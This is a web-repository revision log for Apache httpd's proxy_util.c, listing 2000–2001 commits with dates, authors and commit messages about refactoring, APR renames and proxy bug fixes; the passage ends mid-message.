([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89837))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89837)

Modified
*Tue Jul 31 19:12:56 2001 UTC*
(23 years, 6 months ago)
by *orlikowski*

File length: 31888 byte(s)

Diff to [previous 89829](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89829&r2=89837)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89829&r2=89837&diff_format=h))
```
Being slightly picky: properly namespace protect make_fake_req()

```

---

Revision [**89829**](/viewvc?view=revision&revision=89829) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89829&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89829&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89829))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89829)

Modified
*Tue Jul 31 16:25:18 2001 UTC*
(23 years, 6 months ago)
by *orlikowski*

File length: 31879 byte(s)

Diff to [previous 89473](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89473&r2=89829)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89473&r2=89829&diff_format=h))
```
Nobody screamed. ;)
This gets rid of ap_proxy_host2addr, and a few other useless functions,
and allows us to be threadsafe when doing DNS resolution.

```

---

Revision [**89473**](/viewvc?view=revision&revision=89473) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89473&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89473&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89473))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89473)

Modified
*Thu Jun 28 12:48:57 2001 UTC*
(23 years, 7 months ago)
by *chuck*

File length: 34734 byte(s)

Diff to [previous 89471](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89471&r2=89473)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89471&r2=89473&diff_format=h))
```
Reorganize ap_proxy_string_read() internally to not process eos buckets.

```

---

Revision [**89471**](/viewvc?view=revision&revision=89471) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89471&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89471&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89471))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89471)

Modified
*Thu Jun 28 07:05:18 2001 UTC*
(23 years, 7 months ago)
by *orlikowski*

File length: 34546 byte(s)

Diff to [previous 89280](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89280&r2=89471)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89280&r2=89471&diff_format=h))
```
An EOS bucket doesn't contain anything, so why shouldn't we skip it?

```

---

Revision [**89280**](/viewvc?view=revision&revision=89280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89280)

Modified
*Wed Jun 6 21:51:58 2001 UTC*
(23 years, 7 months ago)
by *chuck*

File length: 34534 byte(s)

Diff to [previous 89085](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89085&r2=89280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89085&r2=89280&diff_format=h))
```
Use apr-util's date functions now

```

---

Revision [**89085**](/viewvc?view=revision&revision=89085) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89085&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89085&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89085))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89085)

Modified
*Fri May 11 17:32:41 2001 UTC*
(23 years, 8 months ago)
by *ianh*

File length: 34528 byte(s)

Diff to [previous 89044](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89044&r2=89085)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89044&r2=89085&diff_format=h))
```
Allows Mod_proxy to be dynamically loaded on win32 systems
PR:
Obtained from:
Submitted by:	ianh
Reviewed by:	Chuck Murcko, Graham

```

---

Revision [**89044**](/viewvc?view=revision&revision=89044) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89044&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89044&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89044))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89044)

Modified
*Mon May 7 02:47:51 2001 UTC*
(23 years, 8 months ago)
by *chuck*

File length: 34213 byte(s)

Diff to [previous 89037](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89037&r2=89044)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=89037&r2=89044&diff_format=h))
```
Crikey.

```

---

Revision [**89037**](/viewvc?view=revision&revision=89037) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89037&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=89037&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=89037))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=89037)

Modified
*Sun May 6 10:59:22 2001 UTC*
(23 years, 8 months ago)
by *chuck*

File length: 34212 byte(s)

Diff to [previous 88927](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88927&r2=89037)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88927&r2=89037&diff_format=h))
```
Track Greg's change to byte count for input filters

```

---

Revision [**88927**](/viewvc?view=revision&revision=88927) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88927&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88927&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88927))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88927)

Modified
*Tue Apr 24 04:38:53 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34213 byte(s)

Diff to [previous 88926](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88926&r2=88927)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88926&r2=88927&diff_format=h))
```
Made the variable naming the same as everywhere else in Apache for the
ap_get_brigade() fix.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88926**](/viewvc?view=revision&revision=88926) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88926&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88926&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88926))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88926)

Modified
*Tue Apr 24 02:50:19 2001 UTC*
(23 years, 9 months ago)
by *orlikowski*

File length: 34178 byte(s)

Diff to [previous 88922](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88922&r2=88926)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88922&r2=88926&diff_format=h))
```
Just for the sake of cleanliness ...

```

---

Revision [**88922**](/viewvc?view=revision&revision=88922) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88922&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88922&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88922))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88922)

Modified
*Mon Apr 23 21:03:39 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34149 byte(s)

Diff to [previous 88854](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88854&r2=88922)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88854&r2=88922&diff_format=h))
```
Apply changes to ap_get_brigade() to the proxy code.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88854**](/viewvc?view=revision&revision=88854) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88854&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88854&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88854))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88854)

Modified
*Sat Apr 14 07:03:00 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34176 byte(s)

Diff to [previous 88817](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88817&r2=88854)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88817&r2=88854&diff_format=h))
```
Make hooks work for the *_canon() functions. Work continues.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88817**](/viewvc?view=revision&revision=88817) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88817&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88817&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88817))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88817)

Modified
*Thu Apr 12 01:57:48 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34155 byte(s)

Diff to [previous 88797](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88797&r2=88817)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88797&r2=88817&diff_format=h))
```
FTP directory filter works now.
Many FIXME notes added.
Much overhauling of proxy_ftp.c
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88797**](/viewvc?view=revision&revision=88797) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88797&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88797&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88797))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88797)

Modified
*Tue Apr 10 20:44:16 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34073 byte(s)

Diff to [previous 88793](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88793&r2=88797)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88793&r2=88797&diff_format=h))
```
Make sure the filter stack in a reused downstream connection is reset
so we don't get lots of DECHUNK filters when we don't want them.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88793**](/viewvc?view=revision&revision=88793) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88793&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88793&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88793))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88793)

Modified
*Tue Apr 10 19:52:40 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 33583 byte(s)

Diff to [previous 88777](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88777&r2=88793)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88777&r2=88793&diff_format=h))
```
We now keep the entire conn_rec across downstream keepalives, not
just the socket.
Made the "keepalive mismatch" message more accurate.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88777**](/viewvc?view=revision&revision=88777) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88777&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88777&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88777))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88777)

Modified
*Tue Apr 10 00:13:56 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 33585 byte(s)

Diff to [previous 88740](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88740&r2=88777)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88740&r2=88777&diff_format=h))
```
Compiler warnings - yuck!
Moved ap_proxy_string_read() to proxy_util.c so it can be used by
proxy_http.c
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88740**](/viewvc?view=revision&revision=88740) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88740&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88740&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88740))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88740)

Modified
*Fri Apr 6 14:25:54 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 32378 byte(s)

Diff to [previous 88739](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88739&r2=88740)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88739&r2=88740&diff_format=h))
```
Bugfixes to proxy_ftp.c -> in some places uri_addr was used instead
of connect_addr - all hail cut and paste!
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88739**](/viewvc?view=revision&revision=88739) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88739&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88739&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88739))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88739)

Modified
*Fri Apr 6 10:44:08 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 32371 byte(s)

Diff to [previous 88732](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88732&r2=88739)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88732&r2=88739&diff_format=h))
```
Converted send_dir() to ap_proxy_send_dir_filter() in proxy_ftp.c.
Fixed up the header files
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88732**](/viewvc?view=revision&revision=88732) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88732&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88732&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88732))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88732)

Modified
*Thu Apr 5 18:53:04 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 32605 byte(s)

Diff to [previous 88721](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88721&r2=88732)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88721&r2=88732&diff_format=h))
```
Cleanup of dead functions within proxy_util.c.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88721**](/viewvc?view=revision&revision=88721) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88721&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88721&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88721))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88721)

Modified
*Wed Apr 4 18:47:42 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 34348 byte(s)

Diff to [previous 88648](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88648&r2=88721)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88648&r2=88721&diff_format=h))
```
Some code rewriting in ap_proxy_connect_handler():
*) Fixed bug where a hostname without a "." in it (such as "localhost")
would not trigger an IP address check with ProxyBlock.
*) Fixed ProxyBlock bugs with ap_proxy_http_handler() and
ap_proxy_connect_handler().
*) Updated ap_proxy_connect_handler() to support APR, while
moving some common code between http_handler and connect_handler
to proxy_util.c.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88648**](/viewvc?view=revision&revision=88648) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88648&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88648&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88648))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88648)

Modified
*Mon Apr 2 17:04:19 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

File length: 32760 byte(s)

Diff to [previous 88534](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88534&r2=88648)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88534&r2=88648&diff_format=h))
```
  *) Added support for downstream keepalives in mod_proxy.
  *) Changed mod_proxy ap_proxy_http_handler() to support APR properly.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88534**](/viewvc?view=revision&revision=88534) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88534&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88534&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88534))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88534)

Modified
*Mon Mar 19 08:54:41 2001 UTC*
(23 years, 10 months ago)
by *chuck*

File length: 31880 byte(s)

Diff to [previous 88525](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88525&r2=88534)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88525&r2=88534&diff_format=h))
```
reorganize STATUS; update copyright

```

---

Revision [**88525**](/viewvc?view=revision&revision=88525) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88525&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88525&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88525))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88525)

Modified
*Fri Mar 16 05:49:51 2001 UTC*
(23 years, 10 months ago)
by *chuck*

File length: 31875 byte(s)

Diff to [previous 88518](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88518&r2=88525)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88518&r2=88525&diff_format=h))
```
change INADDR_NONE to APR_INADDR_NONE
Submitted by:	Ian Holsman <IanH@cnet.com>
Reviewed by:	Chuck Murcko

```

---

Revision [**88518**](/viewvc?view=revision&revision=88518) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88518&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88518&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88518))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88518)

Modified
*Wed Mar 14 21:16:41 2001 UTC*
(23 years, 10 months ago)
by *minfrin*

File length: 31871 byte(s)

Diff to [previous 88487](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88487&r2=88518)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88487&r2=88518&diff_format=h))
```
Pull in the Connection handling part of the v1.3 patch for HTTP/1.1.
Some preliminary HTTP/1.1 work
Some comments and fixes
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88487**](/viewvc?view=revision&revision=88487) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88487&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88487&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88487))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88487)

Modified
*Sun Mar 11 10:42:14 2001 UTC*
(23 years, 10 months ago)
by *chuck*

File length: 31867 byte(s)

Diff to [previous 88077](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88077&r2=88487)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88077&r2=88487&diff_format=h))
```
Cache removed, with other spooge
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88077**](/viewvc?view=revision&revision=88077) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88077&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88077&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88077))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88077)

Modified
*Sun Feb 11 00:12:43 2001 UTC*
(23 years, 11 months ago)
by *rbb*

File length: 39519 byte(s)

Diff to [previous 88019](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88019&r2=88077)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88019&r2=88077&diff_format=h))
```
Fix any compile breaks after moving apr_snprintf and apr_vsnprintf to
apr_strings.h

```

---

Revision [**88019**](/viewvc?view=revision&revision=88019) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88019&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88019&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88019))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88019)

Modified
*Thu Feb 8 07:45:33 2001 UTC*
(23 years, 11 months ago)
by *dougm*

File length: 39494 byte(s)

Diff to [previous 88004](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88004&r2=88019)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=88004&r2=88019&diff_format=h))
```
renaming various functions for consistency sake
see: <http://apr.apache.org/~dougm/apr_rename.pl>
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88004**](/viewvc?view=revision&revision=88004) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88004&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=88004&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=88004))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=88004)

Modified
*Wed Feb 7 05:41:35 2001 UTC*
(23 years, 11 months ago)
by *chuck*

File length: 39472 byte(s)

Diff to [previous 87935](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87935&r2=88004)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87935&r2=88004&diff_format=h))
```
Changes to get running on the current codebase
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**87935**](/viewvc?view=revision&revision=87935) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87935&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87935&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87935))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87935)

Modified
*Wed Jan 31 23:11:05 2001 UTC*
(23 years, 11 months ago)
by *wrowe*

File length: 39446 byte(s)

Diff to [previous 87760](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87760&r2=87935)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87760&r2=87935&diff_format=h))
```

  Fix the remaining APR_FINFO_NORM occurances.  Again, followup is needed
  to actually test any field outside the scope of APR_FINFO_MIN.

```

---

Revision [**87760**](/viewvc?view=revision&revision=87760) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87760&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87760&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87760))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87760)

Modified
*Sat Jan 20 21:42:23 2001 UTC*
(24 years ago)
by *wrowe*

File length: 39447 byte(s)

Diff to [previous 87731](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87731&r2=87760)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87731&r2=87760&diff_format=h))
```

  The changes required for the APR_FINFO_wanted argument to
  apr_stat/lstat/getfileinfo.  These are -NOT- optimal, they
  are simply the required changes to get the server working.
  The size of the patch is a warning about how we need to
  really look at what we are trying to accomplish with all
  of these stat/lstat calls.

```

---

Revision [**87731**](/viewvc?view=revision&revision=87731) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87731&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87731&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87731))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87731)

Modified
*Fri Jan 19 07:04:36 2001 UTC*
(24 years ago)
by *wrowe*

File length: 39431 byte(s)

Diff to [previous 87460](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87460&r2=87731)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87460&r2=87731&diff_format=h))
```

  The big change.  This is part 3 of the apr-util symbols rename, please
  see the first commit of srclib/apr-util/include (cvs apr-util/include)
  for the quick glance at symbols changed.

```

---

Revision [**87460**](/viewvc?view=revision&revision=87460) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87460&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87460&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87460))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87460)

Modified
*Wed Dec 20 16:44:01 2000 UTC*
(24 years, 1 month ago)
by *trawick*

File length: 39430 byte(s)

Diff to [previous 87424](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87424&r2=87460)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87424&r2=87460&diff_format=h))
```
Switch to the APR-provided APR_CHARSET_EBCDIC feature test macro.

```

---

Revision [**87424**](/viewvc?view=revision&revision=87424) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87424&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=87424&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=87424))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=87424)

Modified
*Tue Dec 19 17:05:48 2000 UTC*
(24 years, 1 month ago)
by *rbb*

File length: 39432 byte(s)

Diff to [previous 87399](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87399&r2=87424)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=87399&r2=87424&diff_format=h))
```
Force all Apache functions to be linked into the executable, whether they
are used or not.  This uses the same mechanism that is used for APR
and APR-util.  This may not be the correct solution, but it works, and that
